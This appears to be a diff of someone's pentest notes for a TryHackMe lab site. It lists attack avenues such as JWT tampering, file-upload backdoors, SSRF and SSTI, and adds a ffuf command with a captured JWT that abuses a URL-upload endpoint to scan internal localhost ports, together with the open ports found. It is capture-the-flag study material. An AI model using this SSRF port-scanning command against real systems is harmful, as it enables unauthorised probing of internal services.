@@ -3,6 +3,12 @@ JWT
 Modification Request POST Login JSON
 API
 File Upload (if download != file exec backdoor)
-URL Upload (Information Disclosure file) (Leverage -> SSRF)
-Localhost (Internal attack?)
-SSTI
+URL Upload (Information Disclosure file) (Leverage -> SSRF (Server-Side Request Forgery))
+Localhost (Internal attack?) (local port scanning)
+script ffuf -X POST -u http://storage.cloudsite.thm/api/store-url -b "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxpbWluQGdtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTAyNDYxNywiZXhwIjoxNzQxMDI4MjE3fQ.QR9xR6f5raCYSOI2AGFh08q8LSsBCu7bJ-WWsAkZAow" -H "Content-Type: application/json" -d '{ "url": "http://127.0.0.1:FUZZ" }' -w listport -fc 500,401 -t 100 -H "User-Agent: Mozilla/5.0"
+80                      [Status: 200, Size: 106, Words: 5, Lines: 1]
+3000                    [Status: 200, Size: 106, Words: 5, Lines: 1]
+8000                    [Status: 200, Size: 106, Words: 5, Lines: 1]
+15672                   [Status: 200, Size: 106, Words: 5, Lines: 1]
+
+SSTI (Server Site Template Injection)
